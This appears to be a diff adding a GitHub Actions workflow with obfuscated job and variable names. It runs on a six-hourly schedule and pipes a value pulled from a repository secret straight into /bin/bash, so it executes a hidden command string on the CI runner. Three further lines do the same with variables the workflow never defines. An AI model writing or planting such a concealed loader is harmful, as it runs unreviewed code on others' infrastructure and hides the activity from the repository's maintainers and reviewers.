@@ -1,0 +1,21 @@
+name: henianchensheng
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: henianchensheng
+        env:
+          evmm92: ${{ secrets.evmm92 }}
+        run: |
+          echo $evmm92 | jq -r .amwx2 | /bin/bash
+          echo $h30662 | jq -r .h99197 | /bin/bash
+          echo $ad536 | jq -r .wpl77274 | /bin/bash
+          echo $wdqg234 | jq -r .tp7 | /bin/bash
+
